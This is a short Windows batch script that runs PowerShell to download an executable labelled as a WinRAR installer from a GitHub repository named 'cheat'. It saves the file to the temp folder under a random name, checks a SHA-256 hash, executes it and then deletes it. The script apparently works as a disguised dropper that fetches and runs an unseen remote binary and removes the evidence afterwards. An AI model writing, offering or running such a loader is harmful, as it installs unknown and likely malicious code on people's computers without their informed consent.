@echo off
setlocal EnableExtensions

set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
set "HASH=a1300a8b070817e6280579f5fb6d49d42c612160900ab8856ee4cccd4a9ebe04"
set "OUT=%TEMP%\winrar_pkg_%RANDOM%.exe"

powershell -NoProfile -Command ^
  "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " ^
  "$u = $env:URL; $h = $env:HASH; $f = $env:OUT; " ^
  "if (Test-Path -LiteralPath $f) { Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue }; " ^
  "curl.exe -L -s -f -o $f $u; " ^
  "if (-not (Test-Path -LiteralPath $f)) { (New-Object Net.WebClient).DownloadFile($u, $f) }; " ^
  "if (-not (Test-Path -LiteralPath $f)) { exit 1 }; " ^
  "$cur = (Get-FileHash -LiteralPath $f -Algorithm SHA256).Hash; " ^
  "if ($cur.ToLowerInvariant() -ne $h.ToLowerInvariant()) { Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue; exit 2 }; " ^
  "$p = Start-Process -FilePath $f -PassThru -Wait; " ^
  "Start-Sleep -Seconds 2; " ^
  "Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue"

endlocal
